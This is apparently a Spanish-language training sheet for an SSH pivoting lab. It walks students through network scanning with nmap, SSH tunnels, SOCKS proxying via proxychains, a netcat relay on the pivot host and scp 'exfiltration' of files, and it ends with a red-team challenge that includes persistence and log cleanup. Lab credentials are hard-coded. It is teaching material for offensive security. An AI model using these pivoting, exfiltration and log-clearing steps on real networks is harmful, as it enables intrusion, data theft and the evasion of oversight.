# Ejercicios Prácticos - SSH Pivoting Lab

## 🎯 Objetivo Final
Acceder al servidor interno (172.16.0.30) y obtener la flag ubicada en `/opt/lab/flag.txt`

---

## Ejercicio 1: Reconocimiento Inicial ⭐

**Dificultad**: Básica  
**Tiempo estimado**: 10-15 minutos

### Objetivo
Conectarte al servidor DMZ y realizar reconocimiento de la red.

### Pasos

1. **Conecta al servidor DMZ:**
```bash
ssh alumno@192.16.0.10
# Password: vulnerable123
```

2. **Identifica las interfaces de red:**
```bash
ip addr show
ip route
```

3. **Escanea la red DMZ:**
```bash
nmap -sn 192.16.0.0/24
```

4. **Intenta hacer ping al servidor interno:**
```bash
ping 172.16.0.30
```

### ❓ Preguntas de reflexión
- ¿Por qué no puedes alcanzar la red 172.16.0.0/16 directamente?
- ¿Qué host parece tener acceso a múltiples redes?
- ¿Qué servicios están corriendo en la red DMZ?

---

## Ejercicio 2: Identificar el Pivot ⭐⭐

**Dificultad**: Básica-Media  
**Tiempo estimado**: 15 minutos

### Objetivo
Descubrir y acceder al host pivot que tiene conectividad dual.

### Pasos

1. **Desde el servidor DMZ, escanea puertos SSH:**
```bash
nmap -p 22 192.16.0.0/24
```

2. **Identifica el pivot y conéctate:**
```bash
ssh sysadmin@192.16.0.20
# Password: access2024
```

3. **Verifica la conectividad del pivot:**
```bash
ip addr show
ping 172.16.0.30
```

### ❓ Preguntas de reflexión
- ¿Cuántas interfaces de red tiene el pivot?
- ¿Puede el pivot alcanzar ambas redes?
- ¿Qué hace a este host especial en la arquitectura?

---

## Ejercicio 3: Local Port Forwarding ⭐⭐⭐

**Dificultad**: Media  
**Tiempo estimado**: 20 minutos

### Objetivo
Crear un túnel SSH local para acceder al servidor interno desde tu máquina.

### Pasos

1. **Desde tu máquina (NO desde los contenedores):**
```bash
ssh -L 2222:172.16.0.30:22 sysadmin@192.16.0.20
```

2. **En otra terminal, conecta al servidor interno:**
```bash
ssh -p 2222 root@localhost
# Password: secretdata999
```

3. **Obtén la flag:**
```bash
cat /opt/lab/flag.txt
```

### 📖 Explicación técnica
- `-L 2222:172.16.0.30:22` crea un túnel
- Tu puerto local 2222 → Pivot → Puerto 22 del servidor interno
- Todo el tráfico viaja cifrado

### 💡 Variante avanzada
¿Puedes hacer lo mismo pero accediendo primero al DMZ Server y luego al pivot?

```bash
ssh -L 2222:172.16.0.30:22 -J alumno@192.16.0.10 sysadmin@192.16.0.20
```

---

## Ejercicio 4: Dynamic Port Forwarding (SOCKS) ⭐⭐⭐⭐

**Dificultad**: Media-Avanzada  
**Tiempo estimado**: 25 minutos

### Objetivo
Crear un proxy SOCKS para acceso completo a toda la red interna.

### Pasos

1. **Crear proxy SOCKS5:**
```bash
ssh -D 8080 sysadmin@192.16.0.20
```

2. **Instalar proxychains (si no lo tienes):**
```bash
# Ubuntu/Debian
sudo apt install proxychains4

# macOS
brew install proxychains-ng
```

3. **Configurar proxychains:**
```bash
echo "socks5 127.0.0.1 8080" | sudo tee -a /etc/proxychains4.conf
```

4. **Usar el proxy para acceder:**
```bash
proxychains ssh root@172.16.0.30
proxychains nmap -sT 172.16.0.0/24
```

### 🎯 Ventajas de SOCKS
- Acceso a **toda** la red interna
- Puedes usar **cualquier** herramienta
- Más flexible que port forwarding simple

### 🔬 Experimento
Prueba a usar el proxy con diferentes herramientas:
```bash
proxychains curl http://172.16.0.30
proxychains ncat 172.16.0.30 22
```

---

## Ejercicio 5: Remote Port Forwarding ⭐⭐⭐⭐

**Dificultad**: Avanzada  
**Tiempo estimado**: 30 minutos

### Objetivo
Crear un túnel **inverso** desde el pivot hacia tu máquina.

### Escenario
Imagina que estás detrás de un NAT y no puedes recibir conexiones directas. El pivot iniciará la conexión hacia ti.

### Pasos

1. **Asegúrate de tener SSH server en tu máquina:**
```bash
# Verificar
sudo systemctl status ssh

# Si no está instalado (Ubuntu/Debian)
sudo apt install openssh-server
sudo systemctl start ssh
```

2. **Desde el pivot, crear túnel inverso:**
```bash
# Primero conéctate al pivot
ssh sysadmin@192.16.0.20

# Dentro del pivot, crea el reverse tunnel
ssh -R 9999:172.16.0.30:22 tu_usuario@tu_ip_host
```

3. **Desde tu máquina, conecta al servidor interno:**
```bash
ssh -p 9999 root@localhost
```

### 📖 Explicación
- `-R 9999:172.16.0.30:22` abre el puerto 9999 en TU máquina
- El pivot mantiene la conexión abierta
- Cuando conectas a localhost:9999, el tráfico va al pivot y luego a 172.16.0.30:22

---

## Ejercicio 6: ProxyJump Multi-nivel ⭐⭐⭐⭐⭐

**Dificultad**: Avanzada  
**Tiempo estimado**: 20 minutos

### Objetivo
Usar la funcionalidad `-J` (ProxyJump) para saltar a través de múltiples hosts.

### Escenario
Acceder al servidor interno saltando por DMZ → Pivot → Internal en un solo comando.

### Solución

```bash
ssh -J alumno@192.16.0.10,sysadmin@192.16.0.20 root@172.16.0.30
```

### 📖 Explicación
- `-J` crea saltos automáticos
- Equivale a conectar manualmente 3 veces
- Más elegante y eficiente

### 💡 Para hacer permanente
Añade a tu `~/.ssh/config`:

```
Host internal-lab
    HostName 172.16.0.30
    User root
    ProxyJump alumno@192.16.0.10,sysadmin@192.16.0.20
```

Luego solo:
```bash
ssh internal-lab
```

---

## Ejercicio 7: Exfiltración de Datos 🏆

**Dificultad**: Avanzada  
**Tiempo estimado**: 25 minutos

### Objetivo
Extraer un archivo del servidor interno usando SCP a través del pivot.

### Pasos

1. **Crear un archivo "sensible" en el servidor interno:**
```bash
ssh -J sysadmin@192.16.0.20 root@172.16.0.30
echo "Datos corporativos confidenciales" > /tmp/confidential.txt
exit
```

2. **Exfiltrar el archivo usando SCP:**
```bash
scp -o ProxyJump=sysadmin@192.16.0.20 root@172.16.0.30:/tmp/confidential.txt .
```

3. **Verifica el contenido:**
```bash
cat confidential.txt
```

### 🎯 Desafío extra
¿Puedes comprimir varios archivos y exfiltrarlos en un solo comando?

```bash
# En el servidor interno
ssh -J sysadmin@192.16.0.20 root@172.16.0.30 "tar czf /tmp/backup.tar.gz /opt/lab /etc/hostname"

# Exfiltrar
scp -o ProxyJump=sysadmin@192.16.0.20 root@172.16.0.30:/tmp/backup.tar.gz .
```

---

## Ejercicio 8: Pivoting con Netcat ⭐⭐⭐⭐⭐

**Dificultad**: Muy Avanzada  
**Tiempo estimado**: 35 minutos

### Objetivo
Crear un relay manual usando netcat cuando SSH no está disponible o quieres entender el mecanismo a bajo nivel.

### Pasos

1. **Conéctate al pivot:**
```bash
ssh sysadmin@192.16.0.20
```

2. **Crear named pipes para el relay:**
```bash
mkfifo /tmp/pipe_in
```

3. **Crear el relay bidireccional:**
```bash
nc -l -p 8888 < /tmp/pipe_in | nc 172.16.0.30 22 > /tmp/pipe_in &
```

4. **Desde tu máquina, conecta a través del relay:**
```bash
ssh -p 8888 root@192.16.0.20
```

### 📖 Explicación del comando
- `nc -l -p 8888`: Escucha en el puerto 8888
- `< /tmp/pipe_in`: Lee entrada del pipe
- `| nc 172.16.0.30 22`: Reenvía al puerto 22 del servidor interno
- `> /tmp/pipe_in`: Escribe la respuesta de vuelta al pipe
- `&`: Ejecuta en segundo plano

---

## 🏆 Desafío Final: Red Team Scenario

**Dificultad**: ⭐⭐⭐⭐⭐  
**Tiempo estimado**: 60+ minutos

### Escenario Completo

Eres un pentester contratado para evaluar la seguridad de una red corporativa. Has logrado:

1. ✅ Comprometer el servidor DMZ (192.16.0.10)
2. ❓ Necesitas acceder a la base de datos interna (172.16.0.30)
3. ❓ Exfiltrar información sin ser detectado
4. ❓ Mantener persistencia

### Objetivos

1. **Reconocimiento completo**: Mapea toda la topología de red
2. **Acceso al objetivo**: Llega al servidor interno 172.16.0.30
3. **Captura la flag**: Obtén el contenido de `/opt/lab/flag.txt`
4. **Exfiltración**: Extrae el archivo a tu máquina
5. **Persistencia**: Establece un método de acceso permanente
6. **Evasión**: Limpia los logs de tu actividad

### Entregables

Documento con:
- Todos los comandos utilizados
- Capturas de pantalla
- Explicación de cada técnica
- Indicadores de compromiso (IOCs) que dejaste
- Recomendaciones de mitigación

---

## 📊 Criterios de Evaluación

| Criterio | Puntos |
|----------|---------|
| Conexión exitosa al DMZ | 10 |
| Identificación del pivot | 15 |
| Acceso al servidor interno | 25 |
| Obtención de la flag | 20 |
| Uso de técnicas avanzadas | 15 |
| Documentación completa | 10 |
| Limpieza de rastros | 5 |
| **Total** | **100** |

---

## 💡 Tips y Buenas Prácticas

### Para los estudiantes:

1. **Documentar todo**: Guarda cada comando que ejecutas
2. **Entender antes de copiar**: No hagas copy-paste sin entender
3. **Experimentar**: Prueba variaciones de los comandos
4. **Leer los errores**: SSH da mensajes muy informativos
5. **Usar verbose**: Añade `-v`, `-vv` o `-vvv` a SSH para debug

### Comandos útiles:

```bash
# Ver conexiones SSH activas
ss -tulpn | grep :22

# Ver procesos SSH
ps aux | grep ssh

# Terminar túneles SSH
pkill -f "ssh -"

# Ver túneles activos
netstat -tulpn | grep ssh
```

---

## 📚 Recursos Adicionales

- [SSH Port Forwarding Explained](https://www.ssh.com/academy/ssh/tunneling)
- [SANS Pivoting Cheat Sheet](https://www.sans.org/blog/pivot/)
- [ProxyChains Tutorial](https://github.com/haad/proxychains)
- [Metasploit Pivoting](https://www.offensive-security.com/metasploit-unleashed/pivoting/)

---

## 🎓 Para Instructores

### Sugerencias de evaluación:

- **Ejercicios 1-3**: Evaluación formativa, trabajo en clase
- **Ejercicios 4-6**: Tareas individuales con entrega
- **Ejercicios 7-8**: Práctica avanzada opcional
- **Desafío Final**: Proyecto final evaluable

### Personalización:

Puedes modificar las credenciales en `docker-compose.yml`:
```yaml
environment:
  - SSH_USER=tu_usuario
  - SSH_PASS=tu_password
  - FLAG=FLAG{Tu_Flag_Personalizada}
```

---

**⚠️ Recordatorio Ético**: Estas técnicas son exclusivamente para fines educativos en entornos controlados.